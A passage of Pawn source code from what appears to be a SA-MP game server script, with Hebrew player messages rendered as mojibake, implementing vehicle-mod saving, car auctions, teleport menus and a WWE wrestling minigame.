		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /vmod [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /vmod save :∙ющ°· ыь ф∙щЇх°щэ ∙ь ф°ыс");
			SendClientMessage(playerid,white," /vmod load :шЄщЁ· ыь ф∙щЇх°щэ ∙ь ф°ыс");
			SendClientMessage(playerid,white," /vmod reset :ючщў· ыь ф∙щЇх°щэ ∙ь ф°ыс");
			SendClientMessage(playerid,white," /vmod scolors :∙ющ°· фЎсЄщэ ∙ь ф°ыс");
			SendClientMessage(playerid,white," /vmod scolors2 :∙ющ°· фЎсЄщэ ∙ь ф°ыс ф∙Ёщ ∙ьъ");
			SendClientMessage(playerid,white," /vmod paintjob :∙ющ°· фЇщщЁшт'хс ∙ь ф°ыс");
			return 1;
		}
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER || playerinfo[playerid][vehicle][1] == -1 || !IsPlayerInVehicle(playerid,playerinfo[playerid][vehicle][1])) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт с°ыс ∙ьъ");
		if(equal(cmd,"save"))
		{
			if(!playerinfo[playerid][vehicle][0]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ўЁщ·");
			new total = 0, md;
			for(new i = 0; i <= 13; i++)
			{
				md = GetVehicleComponentInSlot(v,i);
				format(string,sizeof(string),"VehicleMod%d",i);
				if(md >= 1000)
				{
					if(playerinfo[playerid][pvmod][i] != md) fsetint(fuser(playerid),string,md);
					playerinfo[playerid][pvmod][i] = md, total++;
				}
				else
				{
					playerinfo[playerid][pvmod][i] = 0;
					if(fkeyexist(fuser(playerid),string)) fremovekey(fuser(playerid),string);
				}
			}
			if(total == 1) return SendClientMessage(playerid,green," .Ё∙ю° ёъ фыь ∙щЇх° °ыс рчу");
			else if(!total) return SendClientMessage(playerid,red," .рщя ь°ыс ∙хэ ∙щЇх°щэ");
			else
			{
				format(string,sizeof(string)," .Ё∙ю°х ёъ фыь %d ∙щЇх°щ °ыс",total);
				SendClientMessage(playerid,green,string);
			}
		}
		else if(equal(cmd,"load"))
		{
			if(!playerinfo[playerid][vehicle][0]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ўЁщ·");
			new total = 0;
			for(new i = 0; i <= 13; i++) if(playerinfo[playerid][pvmod][i] > 0 && GetVehicleComponentInSlot(v,i) < 1000) if(IsComponentidCompatible(GetVehicleModel(v),playerinfo[playerid][pvmod][i]))
			{
				total++;
				AddVehicleComponent(v,playerinfo[playerid][pvmod][i],playerid);
			}
			if(!total) return SendClientMessage(playerid,red," .рщя ьъ ∙щЇх°щэ ∙юх°щэ");
			format(string,sizeof(string)," .ЁшЄЁх сёъ фыь %d ∙щЇх°щ °ыс",total);
			SendClientMessage(playerid,green,string);
			PlaySound(playerid,1133);
		}
		else if(equal(cmd,"reset"))
		{
			if(!playerinfo[playerid][vehicle][0]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ўЁщ·");
			new total = 0;
			for(new i = 0; i <= 13; i++)
			{
				if(playerinfo[playerid][pvmod][i] > 0)
				{
					playerinfo[playerid][pvmod][i] = 0;
					format(string,sizeof(string),"VehicleMod%d",i);
					if(fkeyexist(fuser(playerid),string)) fremovekey(fuser(playerid),string);
					total++;
				}
				if(GetVehicleComponentInSlot(v,i) >= 1000) RemoveVehicleComponent(v,GetVehicleComponentInSlot(v,i));
			}
			if(total == 1) return SendClientMessage(playerid,green," .Ёючў ёъ фыь ∙щЇх° °ыс рчу");
			else if(!total) return SendClientMessage(playerid,red," .рщя ь°ыс ∙хэ ∙щЇх°щэ");
			else
			{
				format(string,sizeof(string)," .Ёючўх ёъ фыь %d ∙щЇх°щ °ыс",total);
				SendClientMessage(playerid,green,string);
			}
		}
		else if(equal(cmd,"scolors"))
		{
			if(!playerinfo[playerid][vehicle][0]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ўЁщ·");
			if(vehicleinfo[v][vcol][0] == vehicleinfo[v][newvcol][0] && vehicleinfo[v][vcol][1] == vehicleinfo[v][newvcol][1]) return SendClientMessage(playerid,red," .ьр фчьЇ· ЎсЄщэ");
			fsetint(fuser(playerid),"VehicleColor1",vehicleinfo[v][newvcol][0]);
			fsetint(fuser(playerid),"VehicleColor2",vehicleinfo[v][newvcol][1]);
			for(new i = 0; i < 2; i++) vehicleinfo[v][vcol][i] = vehicleinfo[v][newvcol][i], playerinfo[playerid][pvcol][i] = vehicleinfo[v][newvcol][i];
			SendClientMessage(playerid,green," .ЎсЄщ ф°ыс Ё∙ю°х");
		}
		else if(equal(cmd,"scolors2"))
		{
			if(!playerinfo[playerid][vehicle][3]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙Ёщ ∙ўЁщ·");
			if(vehicleinfo[v][vcol][0] == vehicleinfo[v][newvcol][0] && vehicleinfo[v][vcol][1] == vehicleinfo[v][newvcol][1]) return SendClientMessage(playerid,red," .ьр фчьЇ· ЎсЄщэ");
			fsetint(fuser(playerid),"Vehicle2Color1",vehicleinfo[v][newvcol][0]);
			fsetint(fuser(playerid),"Vehicle2Color2",vehicleinfo[v][newvcol][1]);
			for(new i = 0; i < 2; i++) vehicleinfo[v][vcol][i] = vehicleinfo[v][newvcol][i], playerinfo[playerid][pvcol2][i] = vehicleinfo[v][newvcol][i];
			SendClientMessage(playerid,green," .ЎсЄщ ф°ыс ф∙Ёщ Ё∙ю°х");
		}
		else if(equal(cmd,"paintjob"))
		{
			if(!playerinfo[playerid][vehicle][0]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ўЁщ·");
			if(playerinfo[playerid][pvpj] == vehicleinfo[v][vpj]) return SendClientMessage(playerid,red," .ьр фчьЇ· ЇщщЁшт'хс");
			fsetint(fuser(playerid),"VehiclePJ",vehicleinfo[v][vpj]);
			playerinfo[playerid][pvpj] = vehicleinfo[v][vpj];
			SendClientMessage(playerid,green," .фЇщщЁшт'хс ∙ь ф°ыс Ё∙ю°");
		}
		return 1;
	}
	/*if(equal(cmd,"/sellvadv")) // naor
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /sellvadv [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /sellvadv sell [price] :Ї°ёхэ юыщ°· ф°ыс ∙ьъ");
			SendClientMessage(playerid,white," /sellvadv buy :ўЁщщф ∙ь ф°ыс ∙юЇх°ёэ ы°тЄ");
			SendClientMessage(playerid,white," /sellvadv setprice [new price] :∙щЁхщ фючщ° ∙ь ф°ыс сЇ°ёхю·");
			SendClientMessage(playerid,white," /sellvadv stopsell :фЇёў· фюыщ°ф ∙ьъ");
			if(IsPlayerMAdmin(playerid)) SendClientMessage(playerid,white," /sellvadv astopsell :рЇ∙°х· ьрующя - фЇёў· ыь юыщ°ф");
			return 1;
		}
		if(equal(cmd,"sell"))
		{
			if(sellvadv[0] == playerid) return SendClientMessage(playerid,red," .р·ф юЇ°ёэ ы°тЄ р· ф°ыс ∙ьъ ьюыщ°ф");
			if(sellvadv[0] != INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .·хыь ьЇ°ёэ р· ф°ыс ∙ьъ ьюыщ°ф °ў ьрч° ∙фруэ ∙юЇ°ёэ ы°тЄ щёщщэ р· фЇ°ёхю·");
			if(!playerinfo[playerid][vehicle][0]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ўЁщ·");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /sellvadv sell [price] :Ўх°· ф∙щюх∙");
			new price = strval(cmd);
			if(price == 2) return SendClientMessage(playerid,red," .юыщххя ∙∙чўЁщэ юёхщщющэ Є∙хщщэ ьф·сьсь, ьр Ёщ·я ьф∙·ю∙ с-2 сЇўхуф фцх"), SendClientMessage(playerid,red," .рэ Ёщёщ· ьюых° р· ф°ыс ф∙Ёщ ∙ьъ сюыщ°ф ыььщ· - уЄ ∙цф ьр рЇ∙°щ");
			if(price < 0) return SendClientMessage(playerid,red," .ючщ° ющЁхё фхр сь·щ рЇ∙°щ");
			if(price > playerinfo[playerid][vehicle][2] * 2)
			{
				format(string,sizeof(string)," .фючщ° фюўёщюрьщ ∙р·ф щыхь ь·· фхр фючщ° ф°р∙хЁщ ∙ь ф°ыс ∙ьъ ыЇхь 2 - $%d",playerinfo[playerid][vehicle][2] * 2);
				return SendClientMessage(playerid,red,string);
			}
			sellvadv[0] = playerid, sellvadv[1] = price, sellvadv[2] = SetTimer("StopVAdv",120000,0);
			if(!price) format(string,sizeof(string)," >> [юЎщЄ р· ф°ыс ∙ьх ьюыщ°ф счщЁэ!!! [ючщ° счЁх·: $%d %s",playerinfo[playerid][vehicle][2],GetName(playerid));
			else format(string,sizeof(string)," >> [юЎщЄ р· ф°ыс ∙ьх ьюыщ°ф сЄу $%d! [ючщ° °р∙хЁщ: $%d %s",playerinfo[playerid][vehicle][2],price,GetName(playerid));
			SendClientMessageToAll(orange,string);
			format(string,sizeof(string)," >> %s :∙э ф°ыс",GetVehicleName(playerinfo[playerid][vehicle][0]));
			SendClientMessageToAll(orange,string);
			SendClientMessageToAll(orange," >> фюыщ°ф ·ё·щщэ сЄху 2 уўх· | /sellvadv buy юЄхЁщщЁщэ ьўЁх·? ф∙·ю∙х сЇўхуф");
		}
		else if(equal(cmd,"buy"))
		{
			if(sellvadv[0] == playerid) return SendClientMessage(playerid,red," /sellvadv stop :р·ф ьр щыхь ьўЁх· р· ф°ыс ∙р·ф юЇ°ёэ ьюыщ°ф. ьфЇёў· фюыщ°ф");
			if(sellvadv[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .рє рчу ьр юхы° ы°тЄ °ыс");
			if(playerinfo[playerid][vehicle][0] > 0) return SendClientMessage(playerid,red," /sellv :ыс° щ∙ ьъ °ыс ю∙ьъ, ыущ ьюых° рх·х ф∙·ю∙ сЇўхуф");
			if(GetMoney(playerid) < sellvadv[1]) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє");
			format(string,sizeof(string)," >> !ўЁф ююъ р· ф°ыс %s",GetName(playerid));
			SendClientMessage(sellvadv[0],orange,string);
			format(string,sizeof(string)," >> !с$%d [%s] ь∙Єс° %s ўЁф р· ф°ыс ∙ь %s",sellvadv[1],GetVehicleName(playerinfo[sellvadv[0]][vehicle][0]),GetName(sellvadv[0]),GetName(playerid));
			SendClientMessageToAll(orange,string);
			GiveMoney(sellvadv[0],sellvadv[1]);
			GiveMoney(playerid,0-sellvadv[1]);
			if(playerinfo[sellvadv[0]][vehicle][1] != -1) DestroyVehicleEx(playerinfo[sellvadv[0]][vehicle][1]);
			playerinfo[playerid][vehicle][0] = playerinfo[sellvadv[0]][vehicle][0], playerinfo[playerid][vehicle][1] = -1, playerinfo[playerid][vehicle][2] = playerinfo[sellvadv[0]][vehicle][2];
			playerinfo[sellvadv[0]][vehicle][0] = 0, playerinfo[sellvadv[0]][vehicle][1] = -1, playerinfo[sellvadv[0]][vehicle][2] = 0;
			if(playerinfo[playerid][logged])
			{
				fsetint(fuser(playerid),"PVehicle",playerinfo[playerid][vehicle][0]);
				fsetint(fuser(playerid),"VehicleCost",playerinfo[playerid][vehicle][2]);
			}
			Border(playerid,"hidden");
			if(playerinfo[sellvadv[0]][logged])
			{
				fsetint(fuser(sellvadv[0]),"PVehicle",0);
				fsetint(fuser(sellvadv[0]),"VehicleCost",0);
			}
			Border(sellvadv[0],"hidden");
			if(sellvadv[2] != -1) KillTimer(sellvadv[2]);
			StopVAdv();
		}
		else if(equal(cmd,"setprice"))
		{
			if(sellvadv[0] != playerid) return SendClientMessage(playerid,red," .ьр фЎЄ· р· ф°ыс ∙ьъ ьўЁщщф");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /sellvadv setprice [new price] :Ўх°· ф∙щюх∙");
			new newprice = strval(cmd);
			if(newprice < 0) return SendClientMessage(playerid,red," .ючщ° ющЁхё фхр сь·щ рЇ∙°щ");
			if(newprice > playerinfo[playerid][vehicle][2] * 2)
			{
				format(string,sizeof(string)," .фючщ° фюўёщюрьщ ∙р·ф щыхь ь·· фхр фючщ° ф°р∙хЁщ ∙ь ф°ыс ∙ьъ ыЇхь 2 - $%d",playerinfo[playerid][vehicle][2] * 2);
				return SendClientMessage(playerid,red,string);
			}
			if(newprice == playerinfo[playerid][vehicle][2]) return SendClientMessage(playerid,red," .ьр ∙щЁщ· р· фючщ°");
			if(!newprice) format(string,sizeof(string)," >> !!!∙щЁф р· ючщ° ф°ыс ∙фЎщЄ ьюыщ°ф ьчщЁэ %s",GetName(playerid));
			else format(string,sizeof(string)," >> ∙щЁф р· ючщ° ф°ыс ∙фЎщЄ ь $%d %s",newprice,GetName(playerid));
			SendClientMessageToAll(orange,string);
			sellvadv[1] = newprice;
		}
		else if(equal(cmd,"stopsell"))
		{
			if(sellvadv[0] != playerid) return SendClientMessage(playerid,red," .ьр фЎЄ· р· ф°ыс ∙ьъ ьўЁщщф");
			format(string,sizeof(string)," >> фЇёщў р· юыщ°· ф°ыс %s",GetName(playerid));
			SendClientMessageToAll(orange,string);
			if(sellvadv[2] != -1) KillTimer(sellvadv[2]);
			StopVAdv();
		}
		else if(equal(cmd,"astopsell"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя ьсщЎхЄ фЇЄхьф фцх");
			if(sellvadv[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .рє рчу ьр фЎщЄ р· ф°ыс ∙ьх ьўЁщщф");
			format(string,sizeof(string)," >> %s фрующя фЇёщў р· юыщ°· ф°ыс ∙ь",GetName(sellvadv[0]));
			SendClientMessageToAll(orange,string);
			if(sellvadv[2] != -1) KillTimer(sellvadv[2]);
			StopVAdv();
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}*/
	if(equal(cmd,"/auction"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
        if(auctionused) return SendClientMessage(playerid,red," .фЇўхуф ыс° ∙хю∙ф с-5 ∙Ёщх· фрч°хЁх·. рЁр фю·я");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /auction [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /auction start [minimum price] :ф·чь· юыщ°ф Їхюсщ· ∙ь ф°ыс ∙ьъ");
			SendClientMessage(playerid,white," /auction suggest :Ёщёщхя ьўЁщщф срюЎЄх· ыь фыёє ∙сщуъ");
			SendClientMessage(playerid,white," /auction setprice [new minimum price] :∙щЁхщ фюыщ° ∙ь фюыщ°ф фЇхюсщ·");
			SendClientMessage(playerid,white," /auction end :фЇёў· фюыщ°ф фЇхюсщ· ∙ьъ");
			if(IsPlayerMAdmin(playerid)) SendClientMessage(playerid,white," /auction aend :рЇ∙°х· ьрующя - фЇёў· ыь юыщ°ф Їхюсщ·");
			return 1;
		}
		if(equal(cmd,"start"))
		{
			if(auction[0] == playerid) return SendClientMessage(playerid,red," .р·ф ыс° юўщщэ юыщ°ф Їхюсщ· ы°тЄ");
			if(auction[0] != INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .·хыь ьф·чщь юыщ°ф Їхюсщ· чу∙ф °ў ыр∙° фЁхычщ· ·ё·щщэ");
			if(!playerinfo[playerid][vehicle][0]) return SendClientMessage(playerid,red," .рщя ьъ °ыс ∙ўЁщ·");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /auction start [minimum price] :Ўх°· ф∙щюх∙");
			new price = strval(cmd);
			if(price == 2) return SendClientMessage(playerid,red," .юыщххя ∙∙чўЁщэ юёхщщющэ Є∙хщщэ ьф·сьсь, ьр Ёщ·я ьф∙·ю∙ с-2 сЇўхуф фцх"), SendClientMessage(playerid,red," .рэ Ёщёщ· ьюых° р· ф°ыс ф∙Ёщ ∙ьъ сюыщ°ф ыььщ· - уЄ ∙цф ьр рЇ∙°щ");
			if(price < 1) return SendClientMessage(playerid,red," .ючщ° ющЁхё рх ючщ° чщЁэ фхр сь·щ рЇ∙°щ");
			if(price > playerinfo[playerid][vehicle][2] * 2)
			{
				format(string,sizeof(string)," .фючщ° фюўёщюрьщ ∙р·ф щыхь ь·· фхр фючщ° ф°р∙хЁщ ∙ь ф°ыс ∙ьъ ыЇхь 2 - $%d",playerinfo[playerid][vehicle][2] * 2);
				return SendClientMessage(playerid,red,string);
			}
			//auction[0] = playerid, auction[1] = price, SetTimerPck(auction[2],"StopAuction",120000,0,"i",1), auction[3] = INVALID_PLAYER_ID;
			auction[0] = playerid, auction[1] = price, auction[2] = SetTimer("StopAuction",120000,0), auction[3] = INVALID_PLAYER_ID;
			format(string,sizeof(string)," >> %s :ф·чщь юыщ°ф Їхюсщ· ∙ь ф°ыс ∙ьх! ючщ° ющЁщюьщ: $%d, ∙э ф°ыс %s",GetVehicleName(playerinfo[playerid][vehicle][0]),price,GetName(playerid));
            auctionused = 1;
            SetTimer("allowauctionCommand",10000,0);
			SendClientMessageToAll(orange,string);
			SendClientMessageToAll(orange," >> фюыщ°ф фЇхюсщ· ·ё·щщэ сЄху 2 уўх· | /auction suggest юЄхЁщщЁщэ ьфЄьх· р· фючщ° хрхьщ ьцых·? ф∙·ю∙х сЇўхуф");
		}
		else if(equal(cmd,"suggest"))
		{
			if(auction[0] == playerid) return SendClientMessage(playerid,red," /auction end :р·ф ьр щыхь ьЁёх· ьўЁх· р· ф°ыс ∙р·ф Ї°ёю· сюыщ°ф Їхюсщ·. ьфЇёў· фюыщ°ф");
			if(auction[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .ьр ю·ўщщю· ы°тЄ юыщ°ф Їхюсщ·");
			if(playerinfo[playerid][vehicle][0] > 0) return SendClientMessage(playerid,red," /sellv :ыс° щ∙ ьъ °ыс ю∙ьъ, ыущ ьюых° рх·х ф∙·ю∙ сЇўхуф");
			if(GetMoney(playerid) <= auction[1])
			{
				format(string,sizeof(string)," .рщя ьъ юёЇщў ыёє, фюыщ°ф фЇхюсщ· Єхюу· ы°тЄ Єь $%d",auction[1]);
				return SendClientMessage(playerid,red,string);
			}
			format(string,sizeof(string)," >> !фЄьф р· ючщ° ф°ыс сюыщ°ф сЇхюсщ· ь $%d %s",GetMoney(playerid),GetName(playerid));
			SendClientMessageToAll(orange,string);
			SendClientMessage(playerid,red," (урт ∙фыёє фцф щ∙р° Єьщъ! сющуф х·цыф хсыь цр· ьр щфщф ьъ фёыхэ фцф, ьр ·хыь ьўсь р· ф°ыс)");
			auction[3] = playerid, auction[1] = GetMoney(playerid), auctionused = 1, SetTimer("allowauctionCommand",10000,0);
		}
		else if(equal(cmd,"setprice"))
		{
			if(auction[0] != playerid) return SendClientMessage(playerid,red," .ьр щЎ°· юыщ°ф Їхюсщ·");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /auction setprice [new minimum price] :Ўх°· ф∙щюх∙");
			new newprice = strval(cmd);
			if(newprice < 1) return SendClientMessage(playerid,red," .ючщ° ющЁхё рх чщЁэ фхр сь·щ рЇ∙°щ");
			if(newprice > playerinfo[playerid][vehicle][2] * 2)
			{
				format(string,sizeof(string)," .фючщ° фюўёщюрьщ ∙р·ф щыхь ь·· фхр фючщ° ф°р∙хЁщ ∙ь ф°ыс ∙ьъ ыЇхь 2 - $%d",playerinfo[playerid][vehicle][2] * 2);
				return SendClientMessage(playerid,red,string);
			}
			format(string,sizeof(string)," >> ∙щЁф р· фючщ° фющЁщюьщ ∙ь фюыщ°ф фЇхюсщ· ь $%d, ыь фюыщ°ф ю·чщьф ючу∙ %s",newprice,GetName(playerid));
			SendClientMessageToAll(orange,string);
			auction[1] = newprice, auction[3] = INVALID_PLAYER_ID, auctionused = 1, SetTimer("allowauctionCommand",5000,0);
		}
		else if(equal(cmd,"end"))
		{
			if(auction[0] != playerid) return SendClientMessage(playerid,red," .ьр щЎ°· юыщ°ф Їхюсщ·");
			format(string,sizeof(string)," >> фЇёщў р· фюыщ°ф фЇхюсщ· %s",GetName(playerid));
			SendClientMessageToAll(orange,string);
			//if(auction[2] != -1) KillTimer(auction[2]);
			StopAuction();
			auctionused = 1, SetTimer("allowauctionCommand",5000,0);
		}
		else if(equal(cmd,"aend"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя ьсщЎхЄ фЇЄхьф фцх");
			if(auction[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .ьр ю·ўщщю· ы°тЄ юыщ°ф Їхюсщ·");
			format(string,sizeof(string)," >> %s фрующя фЇёщў р· фюыщ°ф фЇхюсщ· ∙ь",GetName(auction[0]));
			SendClientMessageToAll(orange,string);
			//if(auction[2] != -1) KillTimer(auction[2]);
			StopAuction();
			auctionused = 1, SetTimer("allowauctionCommand",5000,0);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/stuntstele"))
	{
		if(!CanBeTeleported(playerid)) return 1;
		if(IsPlayerInAnyVehicle(playerid) && vehicleinfo[GetPlayerVehicleID(playerid)][store] && playerinfo[playerid][vehicle][1] != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid,red," .рщЁъ щыхь ь∙т° °ыс ючЁх· фюыхЁщх· ∙ьр ∙щщъ ьъ");
		new Float:h, string[1024], tname[M_S];
		GetPlayerHealth(playerid,h);
		if(h < min_tele_health)
		{
			format(string,sizeof(string)," .ьр Ёщ·я ьф∙·т° Єэ %.0f %% чщщэ рх Їчх·",min_tele_health);
			return SendClientMessage(playerid,red,string);
		}
		for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Ttype] == tele_stunts)
		{
			strmid(tname,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
			format(tname,sizeof(tname),"%s%s\t\tLevel: %02d",tname,strs(" ",15-strlen(tname)),Teleports[i][Tl]);
			format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,tname);
		}
		ShowPlayerDialog(playerid,dialog_stuntstele,DIALOG_STYLE_LIST,@c(lightblue) "∙щтх°щ ёшрЁшщэ",string,"∙щтх°","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/challenges"))
	{
		if(!CanBeTeleported(playerid)) return 1;
		if(IsPlayerInAnyVehicle(playerid) && vehicleinfo[GetPlayerVehicleID(playerid)][store] && playerinfo[playerid][vehicle][1] != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid,red," .рщЁъ щыхь ь∙т° °ыс ючЁх· фюыхЁщх· ∙ьр ∙щщъ ьъ");
		new Float:h, string[1024], tname[M_S];
		GetPlayerHealth(playerid,h);
		if(h < min_tele_health)
		{
			format(string,sizeof(string)," .ьр Ёщ·я ьф∙·т° Єэ %.0f %% чщщэ рх Їчх·",min_tele_health);
			return SendClientMessage(playerid,red,string);
		}
		for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Ttype] == tele_challenge)
		{
			strmid(tname,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
			format(tname,sizeof(tname),"%s%s\t\tLevel: %02d",tname,strs(" ",15-strlen(tname)),Teleports[i][Tl]);
			format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,tname);
		}
		ShowPlayerDialog(playerid,dialog_challenges,DIALOG_STYLE_LIST,@c(lightblue) "∙щтх°щ р·т°щэ",string,"∙щтх°","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/parachuting"))
	{
		if(!CanBeTeleported(playerid)) return 1;
		if(IsPlayerInAnyVehicle(playerid) && vehicleinfo[GetPlayerVehicleID(playerid)][store] && playerinfo[playerid][vehicle][1] != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid,red," .рщЁъ щыхь ь∙т° °ыс ючЁх· фюыхЁщх· ∙ьр ∙щщъ ьъ");
		new Float:h, string[1024], tname[M_S];
		GetPlayerHealth(playerid,h);
		if(h < min_tele_health)
		{
			format(string,sizeof(string)," .ьр Ёщ·я ьф∙·т° Єэ %.0f %% чщщэ рх Їчх·",min_tele_health);
			return SendClientMessage(playerid,red,string);
		}
		for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Ttype] == tele_parachuting)
		{
			strmid(tname,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
			format(tname,sizeof(tname),"%s%s\t\tLevel: %02d",tname,strs(" ",15-strlen(tname)),Teleports[i][Tl]);
			format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,tname);
		}
		ShowPlayerDialog(playerid,dialog_parachuting,DIALOG_STYLE_LIST,@c(lightblue) "∙щтх°щ ЎЁщчф",string,"∙щтх°","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/wwe"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /wwe [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /wwe state :фЁхычщ· WWE юЎс ·ч°х· ф");
			SendClientMessage(playerid,white," /wwe join :WWE фЎш°Їх· ь");
			SendClientMessage(playerid,white," /wwe quit :WWE Ї°щ∙ф юф");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /wwe start [place 1-3] :чу∙ф WWE ф·чь· ·ч°х·");
				SendClientMessage(playerid,white," /wwe end [reason] :фЁхычщ· WWE ёщхэ ·ч°х· ф");
			}
			SendClientMessage(playerid,white," /wwe viewer [0(off)/1/2] :WWE фЎш°Їх· ыЎхЇф ь");
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(wweinfo[0])
			{
				if(wweinfo[2] > 1)
				{
					format(string,sizeof(string)," .фў°с щ·чщь сЄху ,WWE щ∙ ыЄ· %d ∙Ёщх·",wweinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .хфў°с ыс° ф·чщь WWE щ∙ ыЄ·");
			}
			else SendClientMessage(playerid,red," .WWE рщя ыЄ·");
		}
		else if(equal(cmd,"join"))
		{
			if(!wweinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ WWE рщя");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitwwe]) return SendClientMessage(playerid,red," .фў°с ∙ьъ щ·чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inwwe]) return SendClientMessage(playerid,red," .WWE р·ф ыс° с");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(wweinfo[1] >= 2) return SendClientMessage(playerid,red," /wwe viewer :·Їхёщэ. р·ф щыхь ьф∙··є ыЎхЇф WWE ∙Ёщщэ юфюўхюх· с");
			if(wweinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(playerinfo[playerid][viewerwwe]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙··є ыр∙° р·ф ЎхЇф");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitwwe] = 1;
			playerinfo[playerid][wweid] = wweinfo[1];
			wweinfo[1]++;
			wwejoins[wweinfo[1] == 1 ? 0 : 1] = playerid;
			SendClientMessage(playerid,lightblue," Х Х :WWE фЎш°Ї· ь·ч°х· ф Х Х");
			SendClientMessage(playerid,green," - юш°·ъ фщр ьф·рт°є Єэ фщ°щс ∙ьъ хьф°хт рх·х хсыъ ьЁЎч");
			SendClientMessage(playerid,green," - ∙щэ ьс ыщ юёсщсъ щхЇщЄх Ё∙ўщ ф°сЎф ∙хЁщэ");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",wweinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!wweinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ WWE рщя");
			if(!playerinfo[playerid][inwwe]) return SendClientMessage(playerid,red," .WWE р·ф ьр с");
			SendClientMessage(playerid,green," .WWE Ї°∙· юф");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
